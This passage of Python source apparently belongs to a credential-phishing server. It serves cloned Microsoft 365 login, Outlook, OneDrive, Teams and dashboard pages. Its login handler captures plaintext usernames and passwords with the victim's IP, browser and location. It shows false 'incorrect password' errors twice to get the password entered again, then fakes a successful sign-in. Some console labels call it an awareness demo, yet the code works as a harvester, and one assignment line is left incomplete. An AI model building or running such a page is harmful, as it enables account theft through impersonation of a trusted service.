                    successMsg.style.cssText = 'background:#dff6dd;color:#107c10;padding:12px 14px;border-radius:2px;margin-bottom:16px;border-left:4px solid #107c10;font-size:14px;';
                    successMsg.innerHTML = '✅ ' + (data.message || 'Signing you in...');
                    var form = document.getElementById('loginForm');
                    form.parentNode.insertBefore(successMsg, form);
                    
                    setTimeout(function() {{
                        window.location.href = data.redirect || '/dashboard';
                    }}, 2000);
                }} else {{
                    if (!errorDiv) {{
                        errorDiv = document.createElement('div');
                        errorDiv.id = 'errorMessage';
                        errorDiv.style.cssText = 'background:#fde7e9;color:#a4262c;padding:10px 14px;border-radius:2px;margin-bottom:16px;border-left:4px solid #a4262c;font-size:14px;display:block;';
                        var form = document.getElementById('loginForm');
                        form.parentNode.insertBefore(errorDiv, form);
                    }}
                    errorDiv.innerHTML = '<span style="margin-right:8px;">&#9888;</span> ' + (data.message || 'Your account or password is incorrect. Please try again.');
                    errorDiv.style.display = 'block';
                    password.value = '';
                    password.focus();
                    password.classList.add('error');
                    
                    var attemptBadge = document.querySelector('.attempt-badge');
                    if (data.attempt && data.max_attempts) {{
                        var remaining = data.max_attempts - data.attempt;
                        var text = remaining > 0 ? remaining + ' attempt(s) remaining' : 'Login successful! Redirecting...';
                        var emoji = remaining > 0 ? '🔒' : '✅';
                        var badgeHtml = '<div style="text-align:center;padding:10px;margin-top:10px;background:' + (remaining === 0 ? '#e8f5e9' : '#fff8e1') + ';border-radius:4px;border:1px solid ' + (remaining === 0 ? '#a5d6a7' : '#ffe082') + ';font-size:13px;">';
                        badgeHtml += '<span style="font-weight:600;color:' + (remaining === 0 ? '#2e7d32' : '#e65100') + ';">Attempt ' + data.attempt + ' of ' + data.max_attempts + '</span>';
                        badgeHtml += '<span style="color:#666;margin-left:10px;">' + emoji + ' ' + text + '</span>';
                        badgeHtml += '</div>';
                        
                        if (attemptBadge) {{
                            attemptBadge.outerHTML = badgeHtml;
                        }} else {{
                            var divider = document.querySelector('.divider');
                            var newBadge = document.createElement('div');
                            newBadge.className = 'attempt-badge';
                            newBadge.innerHTML = badgeHtml;
                            divider.parentNode.insertBefore(newBadge, divider);
                        }}
                        
                        if (remaining === 0) {{
                            setTimeout(function() {{
                                window.location.href = data.redirect || '/dashboard';
                            }}, 2000);
                        }}
                    }}
                }}
            }})
            .catch(function() {{
                loadingDiv.style.display = 'none';
                loginBtn.disabled = false;
                loginBtn.textContent = 'Sign in';
                if (!errorDiv) {{
                    errorDiv = document.createElement('div');
                    errorDiv.id = 'errorMessage';
                    errorDiv.style.cssText = 'background:#fde7e9;color:#a4262c;padding:10px 14px;border-radius:2px;margin-bottom:16px;border-left:4px solid #a4262c;font-size:14px;display:block;';
                    var form = document.getElementById('loginForm');
                    form.parentNode.insertBefore(errorDiv, form);
                }}
                errorDiv.innerHTML = '<span style="margin-right:8px;">&#9888;</span> Network error. Please try again.';
                errorDiv.style.display = 'block';
            }});
        }});

        document.getElementById('password').addEventListener('focus', function() {{
            this.classList.remove('error');
        }});
    </script>
</body>
</html>'''

    @staticmethod
    def get_microsoft365_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f5f6fa; }
        .top-nav { background: #2b2b2b; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; }
        .top-nav .nav-links a { color: #ccc; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .container { max-width: 1200px; margin: 0 auto; padding: 30px 40px; }
        .hero { background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); color: white; padding: 60px 40px; border-radius: 12px; text-align: center; margin-bottom: 30px; }
        .hero h1 { font-size: 40px; font-weight: 300; }
        .hero h1 .icon { font-size: 48px; }
        .hero p { font-size: 18px; margin-top: 12px; opacity: 0.9; }
        .hero .btn { display: inline-block; padding: 12px 32px; background: white; color: #0078d4; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; text-decoration: none; margin-top: 20px; }
        .hero .btn:hover { background: #f0f0f0; }
        .section-title { font-size: 28px; font-weight: 300; margin: 30px 0 20px; color: #1b1b1b; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
        .card { background: white; border-radius: 12px; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); text-align: center; transition: transform 0.2s; cursor: pointer; }
        .card:hover { transform: translateY(-4px); box-shadow: 0 4px 16px rgba(0,0,0,0.12); }
        .card .icon { font-size: 48px; margin-bottom: 12px; display: block; }
        .card h3 { color: #1b1b1b; font-size: 16px; font-weight: 600; }
        .card p { color: #666; font-size: 13px; margin-top: 4px; }
        .back-link { display: inline-block; margin-top: 20px; color: #0078d4; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 24px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        @media (max-width: 768px) {
            .top-nav { padding: 12px 20px; }
            .container { padding: 20px; }
            .hero { padding: 40px 20px; }
            .hero h1 { font-size: 28px; }
        }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Microsoft 365
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/outlook">Outlook</a>
            <a href="/onedrive">OneDrive</a>
            <a href="/teams">Teams</a>
            <a href="/sharepoint">SharePoint</a>
            <a href="/login">Sign in</a>
        </div>
    </div>
    <div class="container">
        <div class="hero">
            <h1><span class="icon">📦</span> Welcome to Microsoft 365</h1>
            <p>Your productivity platform with AI-powered apps and cloud storage</p>
            <a href="/login" class="btn">Sign In to Get Started</a>
        </div>
        <h2 class="section-title">Popular Apps</h2>
        <div class="grid">
            <div class="card" onclick="window.location.href='/outlook'">
                <span class="icon">📧</span>
                <h3>Outlook</h3>
                <p>Email and calendar</p>
            </div>
            <div class="card" onclick="window.location.href='/onedrive'">
                <span class="icon">☁️</span>
                <h3>OneDrive</h3>
                <p>Secure cloud storage</p>
            </div>
            <div class="card" onclick="window.location.href='/teams'">
                <span class="icon">💬</span>
                <h3>Teams</h3>
                <p>Chat and collaborate</p>
            </div>
            <div class="card" onclick="window.location.href='/sharepoint'">
                <span class="icon">📁</span>
                <h3>SharePoint</h3>
                <p>Share and manage content</p>
            </div>
        </div>
        <div style="text-align:center;margin:30px 0;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation. All rights reserved.</div>
    </div>
</body></html>'''

    @staticmethod
    def get_outlook_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook - Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f5f6fa; }
        .top-nav { background: #0072c6; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; }
        .top-nav .nav-links a { color: #ddd; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .card { background: white; border-radius: 12px; padding: 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .card h2 { font-weight: 300; margin-bottom: 16px; color: #1b1b1b; }
        .inbox-item { padding: 14px 0; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .inbox-item:last-child { border-bottom: none; }
        .inbox-item .from { font-weight: 600; color: #1b1b1b; }
        .inbox-item .subject { color: #444; }
        .inbox-item .date { color: #999; font-size: 13px; }
        .back-link { display: inline-block; margin-top: 20px; color: #0072c6; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 20px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        @media (max-width: 768px) { .top-nav { padding: 12px 20px; } }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Outlook
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/onedrive">OneDrive</a>
            <a href="/teams">Teams</a>
            <a href="/login">Sign in</a>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <h2>📥 Inbox</h2>
            <div class="inbox-item">
                <div><span class="from">Microsoft Team</span> <span class="subject">- Welcome to Microsoft 365</span></div>
                <div class="date">Today, 10:30 AM</div>
            </div>
            <div class="inbox-item">
                <div><span class="from">IT Department</span> <span class="subject">- Security update: New login system</span></div>
                <div class="date">Today, 9:15 AM</div>
            </div>
            <div class="inbox-item">
                <div><span class="from">Library Services</span> <span class="subject">- New resources available</span></div>
                <div class="date">Yesterday, 4:20 PM</div>
            </div>
            <div class="inbox-item">
                <div><span class="from">Admin</span> <span class="subject">- Upcoming events</span></div>
                <div class="date">Yesterday, 2:00 PM</div>
            </div>
        </div>
        <div style="text-align:center;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation</div>
    </div>
</body></html>'''

    @staticmethod
    def get_onedrive_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OneDrive - Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f0f2f5; }
        .top-nav { background: #0078d4; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; }
        .top-nav .nav-links a { color: #ddd; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .card { background: white; border-radius: 12px; padding: 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .card h2 { font-weight: 300; margin-bottom: 16px; color: #1b1b1b; }
        .file-list { list-style: none; padding: 0; }
        .file-list li { padding: 12px 0; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
        .file-list li:last-child { border-bottom: none; }
        .file-list .icon { font-size: 22px; }
        .file-list .name { flex: 1; color: #1b1b1b; }
        .file-list .size { color: #999; font-size: 13px; }
        .back-link { display: inline-block; margin-top: 20px; color: #0078d4; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 20px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        @media (max-width: 768px) { .top-nav { padding: 12px 20px; } }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            OneDrive
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/outlook">Outlook</a>
            <a href="/teams">Teams</a>
            <a href="/login">Sign in</a>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <h2>📁 My Files</h2>
            <ul class="file-list">
                <li><span class="icon">📄</span><span class="name">Project_Report.docx</span><span class="size">2.3 MB</span></li>
                <li><span class="icon">📊</span><span class="name">Data_Analysis.xlsx</span><span class="size">1.1 MB</span></li>
                <li><span class="icon">📑</span><span class="name">Presentation.pptx</span><span class="size">4.7 MB</span></li>
                <li><span class="icon">🖼️</span><span class="name">Team_Photo.jpg</span><span class="size">3.2 MB</span></li>
                <li><span class="icon">📁</span><span class="name">Documents</span><span class="size">-</span></li>
            </ul>
        </div>
        <div style="text-align:center;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation</div>
    </div>
</body></html>'''

    @staticmethod
    def get_teams_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teams - Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f3f2f1; }
        .top-nav { background: #4b4b4b; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; }
        .top-nav .nav-links a { color: #ddd; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .card { background: white; border-radius: 12px; padding: 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .card h2 { font-weight: 300; margin-bottom: 16px; color: #1b1b1b; }
        .team-item { padding: 14px 0; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .team-item:last-child { border-bottom: none; }
        .team-item .name { font-weight: 600; color: #1b1b1b; }
        .team-item .status { font-size: 13px; color: #107c10; }
        .team-item .status.away { color: #e67e22; }
        .team-item .status.offline { color: #999; }
        .back-link { display: inline-block; margin-top: 20px; color: #4b4b4b; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 20px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        @media (max-width: 768px) { .top-nav { padding: 12px 20px; } }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Teams
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/outlook">Outlook</a>
            <a href="/onedrive">OneDrive</a>
            <a href="/login">Sign in</a>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <h2>👥 Your Teams</h2>
            <div class="team-item">
                <div><span class="name">IT Department</span></div>
                <div><span class="status">🟢 Online</span></div>
            </div>
            <div class="team-item">
                <div><span class="name">Library Services</span></div>
                <div><span class="status away">🟡 Away</span></div>
            </div>
            <div class="team-item">
                <div><span class="name">Student Council</span></div>
                <div><span class="status">🟢 Online</span></div>
            </div>
            <div class="team-item">
                <div><span class="name">Faculty Meeting</span></div>
                <div><span class="status offline">⚪ Offline</span></div>
            </div>
        </div>
        <div style="text-align:center;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation</div>
    </div>
</body></html>'''

    @staticmethod
    def get_sharepoint_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SharePoint - Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f5f6fa; }
        .top-nav { background: #0072c6; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; }
        .top-nav .nav-links a { color: #ddd; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .card { background: white; border-radius: 12px; padding: 28px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .card h2 { font-weight: 300; margin-bottom: 16px; color: #1b1b1b; }
        .site-item { padding: 14px 0; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .site-item:last-child { border-bottom: none; }
        .site-item .name { font-weight: 600; color: #1b1b1b; }
        .site-item .url { color: #999; font-size: 13px; }
        .back-link { display: inline-block; margin-top: 20px; color: #0072c6; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 20px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        @media (max-width: 768px) { .top-nav { padding: 12px 20px; } }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            SharePoint
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/outlook">Outlook</a>
            <a href="/teams">Teams</a>
            <a href="/login">Sign in</a>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <h2>🌐 Sites</h2>
            <div class="site-item">
                <div><span class="name">Team Site</span></div>
                <div><span class="url">team.contoso.com</span></div>
            </div>
            <div class="site-item">
                <div><span class="name">Document Library</span></div>
                <div><span class="url">docs.contoso.com</span></div>
            </div>
            <div class="site-item">
                <div><span class="name">Project Portal</span></div>
                <div><span class="url">projects.contoso.com</span></div>
            </div>
            <div class="site-item">
                <div><span class="name">Knowledge Base</span></div>
                <div><span class="url">kb.contoso.com</span></div>
            </div>
        </div>
        <div style="text-align:center;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation</div>
    </div>
</body></html>'''

    @staticmethod
    def get_dashboard_page():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #f5f6fa; }
        .top-nav { background: #2b2b2b; color: white; padding: 12px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-nav .brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 300; }
        .top-nav .brand svg { width: 20px; height: 20px; }
        .top-nav .nav-links { display: flex; gap: 20px; flex-wrap: wrap; align-items: center; }
        .top-nav .nav-links a { color: #ccc; text-decoration: none; font-size: 14px; }
        .top-nav .nav-links a:hover { color: white; }
        .top-nav .user-badge { background: #0078d4; padding: 4px 16px; border-radius: 20px; font-size: 13px; }
        .container { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
        .welcome { background: white; border-radius: 12px; padding: 32px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); margin-bottom: 24px; }
        .welcome h2 { font-weight: 300; color: #1b1b1b; }
        .welcome p { color: #666; margin-top: 6px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-bottom: 24px; }
        .stat-card { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); text-align: center; }
        .stat-card .number { font-size: 32px; font-weight: 600; color: #0078d4; }
        .stat-card .label { color: #666; font-size: 13px; margin-top: 4px; }
        .quick-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 16px; }
        .quick-action { background: white; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.08); transition: transform 0.2s; }
        .quick-action:hover { transform: translateY(-3px); box-shadow: 0 4px 16px rgba(0,0,0,0.12); }
        .quick-action .icon { font-size: 28px; }
        .quick-action .name { margin-top: 8px; color: #1b1b1b; font-weight: 500; font-size: 14px; }
        .back-link { display: inline-block; margin-top: 20px; color: #0078d4; text-decoration: none; font-weight: 500; }
        .back-link:hover { text-decoration: underline; }
        .footer { background: #2b2b2b; color: #aaa; padding: 20px 40px; text-align: center; margin-top: 40px; font-size: 13px; }
        .footer a { color: #aaa; text-decoration: none; margin: 0 12px; }
        .footer a:hover { color: white; }
        .signout-btn { color: #ff6b6b !important; }
        .signout-btn:hover { color: #ff4444 !important; }
        @media (max-width: 768px) { .top-nav { padding: 12px 20px; } }
    </style>
</head>
<body>
    <div class="top-nav">
        <div class="brand">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Microsoft 365
        </div>
        <div class="nav-links">
            <a href="/">Home</a>
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/outlook">Outlook</a>
            <a href="/onedrive">OneDrive</a>
            <a href="/teams">Teams</a>
            <span class="user-badge">👤 User</span>
            <a href="/" class="signout-btn">Sign Out</a>
        </div>
    </div>
    <div class="container">
        <div class="welcome">
            <h2>👋 Welcome back!</h2>
            <p>You are signed in to your Microsoft 365 account. Access your apps and files below.</p>
        </div>
        <div class="grid">
            <div class="stat-card"><div class="number">12</div><div class="label">Unread Emails</div></div>
            <div class="stat-card"><div class="number">5</div><div class="label">Files in OneDrive</div></div>
            <div class="stat-card"><div class="number">3</div><div class="label">Team Channels</div></div>
            <div class="stat-card"><div class="number">8</div><div class="label">SharePoint Sites</div></div>
        </div>
        <h3 style="font-weight:300;margin-bottom:16px;">Quick Actions</h3>
        <div class="quick-grid">
            <div class="quick-action" onclick="window.location.href='/outlook'">
                <div class="icon">📧</div>
                <div class="name">Outlook</div>
            </div>
            <div class="quick-action" onclick="window.location.href='/onedrive'">
                <div class="icon">☁️</div>
                <div class="name">OneDrive</div>
            </div>
            <div class="quick-action" onclick="window.location.href='/teams'">
                <div class="icon">💬</div>
                <div class="name">Teams</div>
            </div>
            <div class="quick-action" onclick="window.location.href='/sharepoint'">
                <div class="icon">📁</div>
                <div class="name">SharePoint</div>
            </div>
        </div>
        <div style="text-align:center;margin-top:30px;">
            <a href="/" class="back-link">← Back to Microsoft</a>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:12px;">© 2026 Microsoft Corporation. All rights reserved.</div>
    </div>
</body></html>'''


# ======================== HTTP HANDLER ========================

class PhishingHandler(BaseHTTPRequestHandler):
    db = Database()
    geo_locator = IPGeoLocator()
    alert_system = AlertSystem()
    pages = MicrosoftPages()
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if path == "/" or path == "/home":
            html = self.pages.get_home_page()
            self._serve_html(html)
        
        elif path == "/login":
            html = self.pages.get_login_page()
            self._serve_html(html)
        
        elif path == "/microsoft365":
            html = self.pages.get_microsoft365_page()
            self._serve_html(html)
        
        elif path == "/outlook":
            html = self.pages.get_outlook_page()
            self._serve_html(html)
        
        elif path == "/onedrive":
            html = self.pages.get_onedrive_page()
            self._serve_html(html)
        
        elif path == "/teams":
            html = self.pages.get_teams_page()
            self._serve_html(html)
        
        elif path == "/sharepoint":
            html = self.pages.get_sharepoint_page()
            self._serve_html(html)
        
        elif path == "/dashboard":
            html = self.pages.get_dashboard_page()
            self._serve_html(html)
        
        elif path == "/admin":
            self._serve_admin()
        
        elif path == "/api/users":
            users = self.db.get_users()
            self._send_json(200, {"status": "success", "data": users})
        
        else:
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == "/login":
            self._handle_login()
        elif path == "/api/clear":
            self._handle_clear()
        else:
            self._send_json(404, {"status": "error", "message": "Not found"})
    
    def _serve_html(self, html):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def _handle_login(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = parse_qs(post_data)
            
            username = parsed_data.get('username', [''])[0]
            if not username:
                username = 'unknown_user'
            
            password = parsed_data.get('password', [''])[0]
            if not password:
                password = 'no_password'
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            geo =
            
            attempt_count = self._get_attempt_count(client_ip, username)
            attempt_count += 1
            self._save_attempt_count(client_ip, username, attempt_count)
            
            user = self.db.verify_user(username, password)
            is_valid = user is not None
            
            credential = {
                "timestamp": datetime.now().isoformat(),
                "ip": client_ip,
                "username": username,
                "password": password,
                "user_agent": user_agent,
                "attempt": attempt_count,
                "is_valid": is_valid,
                "country": geo.get('country', 'Unknown'),
                "city": geo.get('city', 'Unknown'),
                "page_url": "/login",
                "session_id": secrets.token_hex(8)
            }
            
            print("\n" + "="*80)
            print("🚨 NEW LOGIN ATTEMPT DEMO ATTEMPT!")
            print("="*80)
            print(f"  👤 Username: {username}")
            print(f"  🔑 Password: {password}")
            print(f"  🌐 IP: {client_ip}")
            print(f"  📍 Location: {geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}")
            print(f"  📊 Attempt: {attempt_count}/3")
            print(f"  🔒 Status: {'✅ VALID USER' if is_valid else '🎣 AWARENESS DEMO'}")
            print("="*80)
            print("")
            
            if is_valid:
                self.alert_system.show_alert(f"VALID USER LOGIN: {username} (Attempt {attempt_count}/3)", "success")
            elif attempt_count >= 3:
                self.alert_system.show_alert(f"LOGIN SUCCESS: {username} (Attempt {attempt_count}/3)", "success")
            else:
                self.alert_system.show_alert(f"AWARENESS DEMO: {username} (Attempt {attempt_count}/3)", "capture")
            
            if attempt_count < 3:
                response = {
                    "status": "error",
                    "message": "Your account or password is incorrect. Please try again.",
                    "attempt": attempt_count,
                    "max_attempts": 3
                }
            else:
                self._reset_attempt_count(client_ip, username)
                response = {
                    "status": "success",
                    "message": "Login successful!",
                    "redirect": "/dashboard",
                    "attempt": attempt_count,
                    "max_attempts": 3
                }
            
            self._send_json(200, response)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            response = {"status": "error", "message": str(e)}
            self._send_json(500, response)
    
